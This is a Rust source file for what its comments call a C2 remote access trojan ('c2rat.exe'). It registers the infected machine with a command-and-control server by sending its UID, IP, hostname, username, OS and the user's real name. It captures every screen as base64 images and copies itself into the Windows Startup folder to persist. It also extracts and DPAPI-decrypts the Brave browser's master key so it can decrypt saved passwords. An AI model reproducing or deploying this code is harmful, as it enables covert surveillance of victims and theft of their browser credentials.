use crate::helpers;
use screenshots::Screen;
use std::collections::HashMap;

use winapi::shared::minwindef::DWORD;
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::dpapi::CRYPTPROTECT_UI_FORBIDDEN;
use winapi::um::wincrypt::DATA_BLOB;

use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    Aes256Gcm,
    Key, // Or `Aes128Gcm`
    Nonce,
};

extern crate reqwest;
extern crate serde_json;
extern crate whoami;

pub fn register_client(host: &str, uid: &str) -> Result<String, String> {
    let uri = format!("{}/register", host);

    let mut obj = HashMap::<&'static str, &'static str>::new();

    obj.insert("uid", uid); // Insert machine UID to send to C2 server.

    let ip = get_ip();

    obj.insert("ip", ip.as_str()); // Insert machine IP to send to C2 server.

    let machine_details = machine_details();

    for (key, value) in &machine_details {
        obj.insert(key, value);
    }

    let client = reqwest::blocking::Client::new();
    let res = client.post(uri).json(&obj).send();

    match res {
        Ok(response) => {
            if response.status().is_success() {
                let text = response.text().unwrap();
                Ok(text)
            } else {
                // Return error message from response body if status code is not 200. The response is a json object. Give me the value of the "message" key.
                let text = response.text().unwrap();
                let json: serde_json::Value = serde_json::from_str(&text).unwrap();
                let message = json["message"].as_str().unwrap();
                Err(message.to_string())
            }
        }
        Err(err) => {
            if err.is_connect() {
                println!("No connection received from C2");
                Err("No connection received from C2".to_string())
            } else {
                Err("Unknown error".to_string())
            }
        }
    }
}

pub fn machine_details() -> HashMap<&'static str, String> {
    let mut details = HashMap::new();
    details.insert("hostname", whoami::hostname());
    details.insert("username", whoami::username());
    details.insert("os", whoami::distro());
    details.insert("lang", whoami::lang().next().unwrap());
    details.insert("fullname", whoami::realname());

    details
}

pub fn get_ip() -> String {
    let res = reqwest::blocking::get("https://api.seeip.org/");

    if res.is_ok() {
        res.unwrap().text().unwrap()
    } else {
        String::from("IP not found.")
    }
}

pub fn capture_screenshot() -> Vec<HashMap<String, String>> {
    let screens = Screen::all().unwrap();
    let mut b64_screens = Vec::new();

    for screen in screens {
        let image = screen.capture().unwrap();
        let buffer = image.to_png().unwrap();

        // Encode the image to a base64 string.
        let base64 = helpers::base64_encode(&buffer);

        // Get the screen ID and convert it to a string.
        let screen_id = screen.display_info.id.to_string();

        let mut obj = HashMap::<String, String>::new();
        obj.insert("id".to_string(), screen_id);
        obj.insert("image".to_string(), base64);

        b64_screens.push(obj);
    }

    b64_screens
}

// Detected by Windows Defender.
pub fn _copy_to_startup() {
    let startup_path = format!(
        "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
        std::env::var("APPDATA").unwrap()
    );
    let program_path = std::env::current_exe().unwrap();

    let _ = std::fs::copy(program_path, startup_path + "c2rat.exe");
}

pub fn fetch_encryption_key() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let local_state_path = format!(
        "{}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
        std::env::var("USERPROFILE").unwrap()
    );

    let local_state_data = std::fs::read_to_string(local_state_path).unwrap();
    // convert to json
    let json: serde_json::Value = serde_json::from_str(&local_state_data).unwrap();

    let encryption_key_decoded =
        helpers::base64_decode(json["os_crypt"]["encrypted_key"].as_str().unwrap());

    let encryption_key = &encryption_key_decoded[5..];

    let mut decrypted_data = DATA_BLOB {
        cbData: encryption_key.len() as DWORD,
        pbData: encryption_key.as_ptr() as *mut _,
    };

    // Call the DPAPI function to decrypt the data
    let mut decrypted_output = DATA_BLOB {
        cbData: 0,
        pbData: std::ptr::null_mut(),
    };
    let _ = unsafe {
        CryptUnprotectData(
            &mut decrypted_data,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut decrypted_output,
        )
    };

    let decrypted_key = unsafe {
        std::slice::from_raw_parts(
            decrypted_output.pbData as *const u8,
            decrypted_output.cbData as usize,
        )
    }
    .to_vec();

    // Free the decrypted output memory
    unsafe { winapi::um::winbase::LocalFree(decrypted_output.pbData as *mut _) };

    println!("Decrypted key: {:?}", decrypted_key);
    Ok(decrypted_key)
}

pub fn brave_password_decryption(password: &str, encryption_key: &[u8]) {
    let iv = &password[3..15];
    let password = &password[15..];

    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(encryption_key));

    // Generate nonce from IV
    let nonce = Nonce::from_slice(iv.as_bytes().try_into().unwrap());

    let decrypted = cipher.decrypt(&nonce, password.as_bytes());

    println!("Decrypted password: {:?}", decrypted);
}
